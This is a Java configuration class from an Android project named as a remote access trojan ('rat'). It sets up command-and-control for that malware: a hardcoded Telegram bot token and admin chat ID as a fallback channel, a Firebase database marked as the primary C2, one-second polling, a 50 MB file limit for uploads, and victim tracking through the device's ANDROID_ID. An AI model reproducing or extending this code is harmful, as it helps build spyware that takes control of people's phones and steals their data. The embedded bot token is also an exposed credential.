package com.enterprise.rat.bot;

import android.provider.Settings;
import com.enterprise.rat.MainApplication;

public class BotConfig {
    // Telegram (fallback)
    public static final String BOT_TOKEN = "8706854210:AAFMuhAjVab0qlX-9o4YFPY94qJqXXhv-rU";
    public static final long ADMIN_CHAT_ID = 8601209747L;
    public static final String BOT_USERNAME = "YOUR_BOT_USERNAME";

    // Firebase (primary C2)
    public static final String FIREBASE_URL = "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com/";
    public static final String FIREBASE_API_KEY = "YOUR_FIREBASE_API_KEY";

    public static final String SESSION_ID = getDeviceSessionId();
    public static final String API_BASE_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    public static final int POLLING_INTERVAL_MS = 1000;
    public static final int MAX_FILE_SIZE = 50 * 1024 * 1024;

    public static String getDeviceSessionId() {
        try {
            String androidId = Settings.Secure.getString(
                MainApplication.getAppContext().getContentResolver(),
                Settings.Secure.ANDROID_ID);
            if (androidId == null || androidId.isEmpty()) {
                return "SESSION_" + System.currentTimeMillis();
            }
            return "SESSION_" + androidId.toUpperCase();
        } catch (Exception e) {
            return "SESSION_" + System.currentTimeMillis();
        }
    }
}
